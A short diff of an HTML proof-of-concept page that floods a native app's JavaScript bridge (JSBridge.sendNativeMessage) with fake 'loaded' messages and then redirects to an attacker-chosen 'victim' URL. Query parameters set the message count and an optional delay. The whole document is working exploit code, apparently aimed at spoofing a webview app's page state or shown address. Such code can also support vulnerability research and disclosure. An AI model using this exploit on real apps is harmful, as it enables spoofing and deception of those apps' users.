@@ -1,13 +1,20 @@
 <!DOCTYPE html>
-<html><head><title>Test</title></head>
+<html><head><meta charset="utf-8"><title>PoC</title></head>
 <body>
-<p id="s">Loading...</p>
+<p id="s">go</p>
 <script>
 (function(){
- var n=300,c=0;
- for(var i=0;i<n;i++){try{window.JSBridge.sendNativeMessage('{"type":"loaded"}');c++;}catch(e){}}
- document.getElementById('s').textContent='Sent '+c+'/'+n;
- location.href='https://example.org/';
+ var q=new URLSearchParams(location.search);
+ var victim=q.get('victim')||'https://example.org/';
+ var n=parseInt(q.get('n')||'300',10); if(!(n>0)) n=300;
+ var delay=parseInt(q.get('delay')||'0',10);
+ function flood(){
+   var c=0;
+   for(var i=0;i<n;i++){try{window.JSBridge.sendNativeMessage('{"type":"loaded"}');c++;}catch(e){}}
+   document.getElementById('s').textContent='flooded '+c+'/'+n;
+   location.href=victim;
+ }
+ if(delay>0){setTimeout(flood,delay);}else{flood();}
 })();
 </script>
 </body></html>
